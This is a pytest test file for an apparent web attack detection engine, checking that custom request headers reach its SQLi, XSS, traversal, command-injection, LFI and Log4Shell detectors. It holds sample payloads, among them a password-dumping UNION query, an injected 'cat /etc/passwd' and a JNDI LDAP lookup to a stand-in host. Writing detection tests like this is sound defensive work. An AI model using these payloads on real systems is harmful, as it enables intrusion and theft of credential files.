"""detect-web: application-specific headers are inspected by the injection detectors (audit #53).

Only 13 well-known reflected headers (UA, Referer, X-Forwarded-* ...) used to reach SQLi / XSS / traversal /
command injection; X-Tenant-Id and friends were ``header_other`` and silent. Framing headers (Accept*, Sec-*,
If-*, trace context ...) stay out to keep browsers and SDKs quiet (benign fixture "app custom headers").
"""

from __future__ import annotations

from collections.abc import Callable

import pytest

from tokiwa.config import Settings
from tokiwa.detect.context import DetectionContext
from tokiwa.detect.engine import DetectionEngine
from tokiwa.detect.web_common import (
    HEADER,
    HEADER_CUSTOM,
    HEADER_OTHER,
    build_view,
    is_framing_header,
)
from tokiwa.schemas.alerts import AlertDraft
from tokiwa.schemas.events import Event


async def _web_drafts(settings: Settings, ev: Event) -> dict[str, AlertDraft]:
    ctx = DetectionContext(settings)
    out: dict[str, AlertDraft] = {}
    for det in DetectionEngine(settings).all_detectors().values():
        if det.id.startswith("web.") and det.accepts(ev):
            for d in await det.process(ev, ctx):
                out[d.rule_id] = d
    return out


@pytest.mark.parametrize(
    ("rule", "payload"),
    [
        ("web.sqli", "1' UNION SELECT username,password FROM users--"),
        ("web.xss", "<img src=x onerror=alert(document.domain)>"),
        ("web.path_traversal", "../../../../etc/passwd"),
        ("web.cmd_injection", "127.0.0.1;cat /etc/passwd"),
        ("web.lfi_rfi", "php://filter/convert.base64-encode/resource=index.php"),
    ],
)
async def test_custom_header_payloads_are_detected(
    rule: str, payload: str, settings: Settings, make_http_event: Callable[..., Event]
) -> None:
    ev = make_http_event("/", headers={"x-tenant-id": payload})
    d = (await _web_drafts(settings, ev))[rule]
    assert d.details["location"] == HEADER_CUSTOM
    assert d.details["param"] == "x-tenant-id"


async def test_custom_header_inspection_can_be_turned_off_or_narrowed(
    settings: Settings, make_http_event: Callable[..., Event]
) -> None:
    ev = make_http_event("/", headers={"x-tenant-id": "1' UNION SELECT username,password FROM users--"})
    settings.detection.web.extra_framing_headers = ["x-tenant-*"]
    assert "web.sqli" not in await _web_drafts(settings, ev)
    settings.detection.web.extra_framing_headers = []
    settings.detection.web.inspect_custom_headers = False
    assert "web.sqli" not in await _web_drafts(settings, ev)


def test_header_classification(make_http_event: Callable[..., Event]) -> None:
    ev = make_http_event(
        "/",
        headers={
            "user-agent": "UA",
            "x-tenant-id": "t1",
            "accept": "*/*",
            "sec-ch-ua-platform": '"Linux"',
            "content-type": "text/plain",
            "traceparent": "00-1-2-01",
        },
    )
    view = build_view(ev)
    assert view is not None
    loc = {t.param: t.location for t in view.targets}
    assert loc["user-agent"] == HEADER
    assert loc["x-tenant-id"] == HEADER_CUSTOM
    assert {loc["accept"], loc["sec-ch-ua-platform"], loc["content-type"], loc["traceparent"]} == {
        HEADER_OTHER
    }
    assert is_framing_header("x-internal-sig", ("x-internal-*",))
    assert not is_framing_header("x-internal-sig", ("x-internal",))


async def test_framing_headers_still_reach_log4shell_and_ognl(
    settings: Settings, make_http_event: Callable[..., Event]
) -> None:
    ev = make_http_event("/", headers={"accept-language": "${jndi:ldap://x.example/a}"})
    assert "web.log4shell" in await _web_drafts(settings, ev)
